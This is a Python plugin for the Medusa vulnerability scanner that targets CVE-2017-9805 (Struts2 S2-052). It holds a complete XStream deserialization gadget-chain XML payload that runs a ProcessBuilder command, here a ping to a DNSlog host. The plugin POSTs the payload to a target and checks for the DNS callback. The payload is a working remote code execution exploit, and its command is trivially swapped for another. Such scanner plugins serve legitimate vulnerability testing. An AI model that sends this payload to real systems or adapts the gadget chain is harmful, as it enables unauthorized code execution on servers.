#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
import urllib3
import requests
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2017-9805" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2017-9-5'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability52"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞52' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "当Struts2使用REST插件使用XStream的实例xstreamhandler处理反序列化XML有效载荷时没有进行任何过滤，可以导致远程执行代码，攻击者可以利用该漏洞构造恶意的XML内容获取服务器权限。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "Struts2.1.2-Struts2.3.33\r\nStruts2.5-Struts2.5.12"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port,path = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    DL=Dnslog()
    con=""
    data="""<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>ping</string>
                        <string>{}</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>""".format(DL.dns_host())
    try:
        payload_url = scheme + "://" + url +":"+ str(port)+path
        headers = {
            'User-Agent': RandomAgent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/xml"
        }


        try:#防止在linux系统上执行了POC，导致超时扫描不到漏洞
            resp = requests.post(payload_url,headers=headers,data=data, timeout=6,proxies=proxies, verify=False)
            con = resp.text
        except:
            pass
        if DL.result():
            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-052)\r\n漏洞详情:\r\n版本号:S2-052\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,data,con,DL.dns_text(),DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, url,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

